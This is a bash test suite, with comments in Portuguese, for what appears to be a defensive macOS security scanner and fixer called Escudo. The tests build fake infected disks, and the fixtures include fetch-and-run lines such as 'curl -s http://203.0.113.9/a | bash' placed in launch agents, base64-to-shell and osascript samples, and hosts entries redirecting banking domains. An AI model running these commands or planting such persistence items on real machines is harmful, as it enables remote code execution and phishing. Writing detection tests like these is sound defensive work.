#!/bin/bash
# Testes do Escudo para Mac. Rodam em qualquer Mac ou Linux sem mexer no sistema:
# as respostas dos comandos vêm das pastas saudavel/ e invadido/, e o "disco" é uma pasta temporária.
#   bash mac/testes/testar-escudo-mac.sh

AQUI=$(cd "$(dirname "$0")" && pwd)
SCRIPT="$AQUI/../escudo-mac.sh"
OK=0
FALHAS=""
confere() { if eval "$2"; then OK=$((OK + 1)); else FALHAS="${FALHAS}  FALHOU: $1"$'\n'; fi; }

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

plist() {
    # plist ARQUIVO PROGRAMA [ARGS...]
    local f="$1"; shift
    {
        echo '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict>'
        echo '<key>Label</key><string>x</string>'
        echo '<key>ProgramArguments</key><array>'
        for a in "$@"; do echo "  <string>$a</string>"; done
        echo '</array></dict></plist>'
    } > "$f"
}

monta_disco() {
    local r="$1"
    mkdir -p "$r/raiz/Library/LaunchAgents" "$r/raiz/Library/LaunchDaemons" "$r/raiz/etc" "$r/casa/Library/LaunchAgents" "$r/raiz/Library/Apple/System/Library/CoreServices/XProtect.bundle"
    plist "$r/raiz/Library/LaunchDaemons/com.google.keystone.daemon.plist" "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/GoogleSoftwareUpdateDaemon"
    plist "$r/casa/Library/LaunchAgents/com.spotify.webhelper.plist" "/Applications/Spotify.app/Contents/MacOS/SpotifyWebHelper"
    printf '127.0.0.1 localhost\n255.255.255.255 broadcasthost\n::1 localhost\n0.0.0.0 anuncio.example\n' > "$r/raiz/etc/hosts"
}

roda() {
    # roda CENARIO PASTA ACAO
    ESCUDO_MOCK="$AQUI/$1" ESCUDO_RAIZ="$2/raiz" ESCUDO_CASA="$2/casa" ESCUDO_DADOS="$2/dados" ESCUDO_SIM=1 bash "$SCRIPT" "$3" 2>&1
}

# --- 1. Funções isoladas ------------------------------------------------------
ESCUDO_FONTE=1 . "$SCRIPT"
confere 'caminho em /tmp é suspeito' 'caminho_suspeito /tmp/.x/agent'
confere 'caminho em /Users/Shared é suspeito' 'caminho_suspeito /Users/Shared/upd'
confere 'pasta escondida é suspeita' 'caminho_suspeito "/Users/max/Library/Application Support/.helper/run"'
confere 'Downloads é suspeito' 'caminho_suspeito /Users/max/Downloads/instalar'
confere 'Applications é normal' '! caminho_suspeito /Applications/Spotify.app/Contents/MacOS/Spotify'
confere 'Library/Google é normal' '! caminho_suspeito /Library/Google/GoogleSoftwareUpdate/x'
confere 'curl | bash é suspeito' '[ -n "$(comando_suspeito "curl -s http://x/p.sh | bash")" ]'
confere 'base64 -d é suspeito' '[ -n "$(comando_suspeito "echo aGk= | base64 -d | sh")" ]'
confere 'osascript -e é suspeito' '[ -n "$(comando_suspeito "osascript -e do shell script")" ]'
confere 'python -c é suspeito' '[ -n "$(comando_suspeito "python3 -c import socket")" ]'
confere 'comando normal não é suspeito' '[ -z "$(comando_suspeito "/Applications/Dropbox.app/Contents/MacOS/Dropbox /firstrunupgrade")" ]'
confere 'backup no cron não é suspeito' '[ -z "$(comando_suspeito "/usr/local/bin/backup.sh --diario")" ]'
plist "$TMP/p.plist" /usr/bin/python3 -c "import os"
confere 'lê ProgramArguments do plist' '[ "$(programa_do_plist "$TMP/p.plist")" = "/usr/bin/python3 -c import os" ]'
confere 'escapa HTML' '[ "$(html_esc "<a & b>")" = "&lt;a &amp; b&gt;" ]'

# --- 2. Mac saudável -----------------------------------------------------------
D1="$TMP/bom"; monta_disco "$D1"
OUT=$(roda saudavel "$D1" verificar)
confere "Mac saudável nota 100 (saída: $(echo "$OUT" | grep Nota))" 'echo "$OUT" | grep -q "Nota do Mac: 100/100"'
confere 'Mac saudável gera relatório' '[ -f "$D1/dados/relatorios/ultimo-mac.html" ]'
confere 'relatório diz que não achou problema' 'grep -q "Nenhum problema encontrado" "$D1/dados/relatorios/ultimo-mac.html"'

# --- 3. Mac invadido -----------------------------------------------------------
D2="$TMP/ruim"; monta_disco "$D2"
plist "$D2/casa/Library/LaunchAgents/com.apple.update.helper.plist" /bin/bash -c "curl -s http://203.0.113.9/a | bash"
plist "$D2/raiz/Library/LaunchDaemons/com.system.svc.plist" "/Users/Shared/.svc/agent"
plist "$D2/casa/Library/LaunchAgents/.hidden.plist" "/Users/max/Library/Application Support/.x/run"
printf '127.0.0.1 localhost\n185.12.33.4 www.bb.com.br\n203.0.113.5 nubank.com.br\n0.0.0.0 swscan.apple.com\n' > "$D2/raiz/etc/hosts"
touch -t 202501010000 "$D2/raiz/Library/Apple/System/Library/CoreServices/XProtect.bundle"
OUT=$(roda invadido "$D2" verificar)
for t in "não recebe mais correção" "Busca automática de atualizações desligada" "Correções de segurança urgentes" "XProtect) não atualizam" "Vacinas do XProtect com" \
         "Gatekeeper desligado" "SIP) desligada" "FileVault desligado" "Firewall desligado" "Modo invisível" "Acesso remoto (SSH)" "Compartilhamento de tela" \
         "entra sozinho, sem senha" "Convidado ativo" "não pede senha ao acordar" "3 contas com poder de administrador" "Perfil de configuração instalado" \
         "Site importante desviado" "Atualizações da Apple bloqueadas" "com.apple.update.helper.plist" "com.system.svc.plist" ".hidden.plist" "Agendamento suspeito"; do
    confere "Mac invadido deveria acusar: $t" 'echo "$OUT" | grep -Fq -- "$t"'
done
confere 'Google e Spotify não são acusados' '! echo "$OUT" | grep -Eqi "keystone|spotify"'
confere 'nota do Mac invadido é 0' 'echo "$OUT" | grep -q "Nota do Mac: 0/100"'
confere 'crítico aparece primeiro' '[ "$(echo "$OUT" | head -1 | cut -c2-8)" = "Critico" ]'
REL="$D2/dados/relatorios/ultimo-mac.html"
confere 'relatório escapa HTML' '! grep -q "<a | bash" "$REL"'
confere 'relatório tem um bloco por problema' '[ "$(grep -o "class=\"item " "$REL" | wc -l | tr -d " ")" = "$(echo "$OUT" | grep -c "^\[")" ]'

# --- 4. Vigia: novidades -------------------------------------------------------
D3="$TMP/vigia"; monta_disco "$D3"
roda saudavel "$D3" vigiar >/dev/null
confere 'primeira vigia grava a linha de base' '[ -s "$D3/dados/linha-de-base.txt" ]'
OUT=$(roda saudavel "$D3" vigiar; cat "$D3/dados/logs/escudo.log")
confere 'segunda vigia sem mudança: 0 novidades' 'echo "$OUT" | tail -1 | grep -q "novidades 0"'
plist "$D3/casa/Library/LaunchAgents/com.novo.app.plist" "/Applications/Novo.app/Contents/MacOS/Novo"
roda saudavel "$D3" vigiar >/dev/null
confere 'vigia percebe item novo na inicialização' 'tail -1 "$D3/dados/logs/escudo.log" | grep -q "novidades 1"'
confere 'novidade aparece no relatório' 'grep -q "com.novo.app.plist" "$D3/dados/relatorios/ultimo-mac.html"'
roda saudavel "$D3" vigiar >/dev/null
confere 'novidade avisa só uma vez' 'tail -1 "$D3/dados/logs/escudo.log" | grep -q "novidades 0"'

# --- 5. Reforçar, desfazer, instalar ------------------------------------------
OUT=$(roda invadido "$D2" reforcar)
BK=$(ls "$D2"/dados/backup/antes-do-reforco-*.txt 2>/dev/null | head -1)
confere 'reforço salva backup antes' '[ -n "$BK" ] && grep -q "firewall=off" "$BK" && grep -q "ConfigDataInstall=0" "$BK"'
OUT=$(roda invadido "$D2" desfazer)
confere 'desfazer acha o backup' 'echo "$OUT" | grep -q "desfeito a partir"'
OUT=$(roda saudavel "$D1" instalar)
confere 'instalar cria o agente diário' '[ -f "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" ]'
confere 'agente roda a vigia às 12:30' 'grep -q "<string>vigiar</string>" "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" && grep -q "<integer>12</integer>" "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist"'
if command -v plutil >/dev/null 2>&1; then
    confere 'agente é um plist válido' 'plutil -lint "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" >/dev/null'
elif command -v python3 >/dev/null 2>&1; then
    confere 'agente é um plist válido' 'python3 -c "import plistlib,sys; plistlib.load(open(sys.argv[1],\"rb\"))" "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist"'
fi
confere 'script instalado na pasta do Escudo' '[ -x "$D1/dados/escudo-mac.sh" ]'
OUT=$(roda saudavel "$D1" desinstalar)
confere 'desinstalar remove o agente' '[ ! -f "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" ]'
OUT=$(roda saudavel "$D1" xyz); COD=$?
confere 'ação inválida mostra o uso' 'echo "$OUT" | grep -q "Uso:" && [ "$COD" = 3 ]'

# --- 6. Varrer e corrigir -------------------------------------------------------
D4="$TMP/corrigir"; monta_disco "$D4"
plist "$D4/casa/Library/LaunchAgents/com.apple.update.helper.plist" /bin/bash -c "curl -s http://203.0.113.9/a | bash"
plist "$D4/raiz/Library/LaunchDaemons/com.system.svc.plist" "/Users/Shared/.svc/agent"
plist "$D4/casa/Library/LaunchAgents/.hidden.plist" "/Users/max/Library/Application Support/.x/run"
HOSTS_ORIG=$'127.0.0.1 localhost\n185.12.33.4 www.bb.com.br bb.com.br\n203.0.113.5 nubank.com.br\n0.0.0.0 swscan.apple.com\n0.0.0.0 anuncio.example'
printf '%s\n' "$HOSTS_ORIG" > "$D4/raiz/etc/hosts"
touch -t 202501010000 "$D4/raiz/Library/Apple/System/Library/CoreServices/XProtect.bundle"
OUT=$(roda invadido "$D4" corrigir)
confere "corrigir mostra antes e depois ($(echo "$OUT" | grep 'Nota do Mac:' | tail -1))" 'echo "$OUT" | grep -Eq "Nota do Mac: 0 -> [0-9]+/100"'
D6="$TMP/so-arquivos"; monta_disco "$D6"
plist "$D6/casa/Library/LaunchAgents/com.apple.update.helper.plist" /bin/bash -c "curl -s http://203.0.113.9/a | bash"
printf '127.0.0.1 localhost\n185.12.33.4 www.bb.com.br\n' > "$D6/raiz/etc/hosts"
OUT6=$(roda saudavel "$D6" corrigir)
confere "invasão por arquivo: nota volta a 100 ($(echo "$OUT6" | grep 'Nota do Mac:' | tail -1))" 'echo "$OUT6" | grep -Eq "Nota do Mac: [0-9]+ -> 100/100" && ! echo "$OUT6" | grep -q "Nota do Mac: 100 ->"'
confere 'item com curl|bash sai da inicialização' '[ ! -f "$D4/casa/Library/LaunchAgents/com.apple.update.helper.plist" ]'
confere 'daemon em /Users/Shared sai da inicialização' '[ ! -f "$D4/raiz/Library/LaunchDaemons/com.system.svc.plist" ]'
confere 'item escondido sai da inicialização' '[ ! -f "$D4/casa/Library/LaunchAgents/.hidden.plist" ]'
confere 'os 3 vão para a quarentena (não apaga)' '[ "$(find "$D4/dados/quarentena" -name "*.plist" | wc -l | tr -d " ")" = 3 ]'
confere 'Google e Spotify continuam' '[ -f "$D4/raiz/Library/LaunchDaemons/com.google.keystone.daemon.plist" ] && [ -f "$D4/casa/Library/LaunchAgents/com.spotify.webhelper.plist" ]'
confere 'hosts: banco falso desativado' 'grep -q "^# \[Escudo desativou\] 185.12.33.4" "$D4/raiz/etc/hosts" && ! grep -q "^203.0.113.5" "$D4/raiz/etc/hosts"'
confere 'hosts: atualização da Apple liberada' '! grep -q "^0.0.0.0 swscan.apple.com" "$D4/raiz/etc/hosts"'
confere 'hosts: mantém localhost e bloqueio de anúncio' 'grep -q "^127.0.0.1 localhost" "$D4/raiz/etc/hosts" && grep -q "^0.0.0.0 anuncio.example" "$D4/raiz/etc/hosts"'
confere 'hosts: guarda cópia' '[ -n "$(ls "$D4"/dados/backup/hosts-*.txt 2>/dev/null)" ]'
ACOES="$D4/dados/.mock-acoes"
confere 'descarrega o item suspeito do launchd' 'grep -q "launchctl unload .*com.apple.update.helper.plist" "$ACOES"'
confere 'desliga o SSH' 'grep -q "launchctl disable system/com.openssh.sshd" "$ACOES"'
confere 'desliga o compartilhamento de tela' 'grep -q "launchctl disable system/com.apple.screensharing" "$ACOES"'
confere 'desliga a entrada sem senha' 'grep -q "defaults delete .*com.apple.loginwindow autoLoginUser" "$ACOES"'
confere 'pede vacinas novas do XProtect' 'grep -q "softwareupdate --background-critical" "$ACOES"'
NOVO=$(ls "$D4"/dados/backup/crontab-novo-*.txt 2>/dev/null | head -1)
confere 'crontab: desativa a linha curl|bash' '[ -n "$NOVO" ] && grep -q "^# \[Escudo desativou\] \*/30" "$NOVO" && grep -q "^crontab .*crontab-novo" "$ACOES"'
confere 'grava o registro para desfazer' '[ -n "$(ls "$D4"/dados/backup/correcoes-*.txt 2>/dev/null)" ]'
confere 'diz o que falta e que só a pessoa muda (SIP, FileVault)' 'echo "$OUT" | grep -q "SIP" && echo "$OUT" | grep -q "FileVault"'
confere 'relatório de correção gerado' '[ -n "$(ls "$D4"/dados/relatorios/mac-correcao-*.html 2>/dev/null)" ]'
OUT=$(roda invadido "$D4" desfazer)
confere 'desfazer: itens voltam da quarentena' '[ -f "$D4/casa/Library/LaunchAgents/com.apple.update.helper.plist" ] && [ -f "$D4/casa/Library/LaunchAgents/.hidden.plist" ] && [ -f "$D4/raiz/Library/LaunchDaemons/com.system.svc.plist" ]'
confere 'desfazer: hosts volta igual' '[ "$(cat "$D4/raiz/etc/hosts")" = "$HOSTS_ORIG" ]'
confere 'desfazer: SSH religado' 'grep -q "launchctl enable system/com.openssh.sshd" "$ACOES"'
confere 'desfazer: crontab original volta' 'grep -q "^crontab .*/backup/crontab-2" "$ACOES"'
confere 'desfazer: marca como desfeito' '[ -n "$(ls "$D4"/dados/backup/correcoes-*.desfeito.txt 2>/dev/null)" ]'
D5="$TMP/limpo"; monta_disco "$D5"
OUT=$(roda saudavel "$D5" corrigir)
confere 'Mac saudável: corrigir não mexe em nada' '[ ! -d "$D5/dados/quarentena" ] && echo "$OUT" | grep -q "Nada que o Escudo corrija sozinho"'
OUT=$(roda saudavel "$D5" instalar)
DAEMON="$D5/raiz/Library/LaunchDaemons/br.com.infinityguard.escudo.corrige.plist"
confere 'instalar cria o serviço que corrige sozinho' '[ -f "$DAEMON" ] && grep -q "<string>corrigir</string>" "$DAEMON"'
confere 'serviço roda uma cópia em pasta do sistema (não a da pasta do usuário)' 'grep -q "Library/Application Support/EscudoInfinityGuard/escudo-mac.sh" "$DAEMON" && ! grep -q "$D5/dados/escudo-mac.sh" "$DAEMON" && [ -x "$D5/raiz/Library/Application Support/EscudoInfinityGuard/escudo-mac.sh" ]'
if command -v python3 >/dev/null 2>&1; then
    confere 'serviço é um plist válido' 'python3 -c "import plistlib,sys; plistlib.load(open(sys.argv[1],\"rb\"))" "$DAEMON"'
fi
roda saudavel "$D5" vigiar >/dev/null
confere 'vigia anota quando rodou (para contar as correções)' '[ -s "$D5/dados/.ultima-vigia" ]'
OUT=$(roda saudavel "$D5" desinstalar)
confere 'desinstalar remove o serviço e a cópia do sistema' '[ ! -f "$DAEMON" ] && [ ! -d "$D5/raiz/Library/Application Support/EscudoInfinityGuard" ]'
ESCUDO_FONTE=1 . "$SCRIPT"
printf '1.2.3.4 a.com b.com\n# 1.2.3.4 a.com\n5.6.7.8 c.com\n' > "$TMP/h"
confere 'hosts_limpo mantém outro nome da linha' '[ "$(hosts_limpo "$TMP/h" a.com | sed -n 2p)" = "1.2.3.4 b.com" ]'
confere 'hosts_limpo não mexe em comentário' '[ "$(hosts_limpo "$TMP/h" a.com | sed -n 3p)" = "# 1.2.3.4 a.com" ]'

echo "Escudo Mac: $OK testes ok, $(printf '%s' "$FALHAS" | grep -c FALHOU) falha(s)"
printf '%s' "$FALHAS"
[ -z "$FALHAS" ]
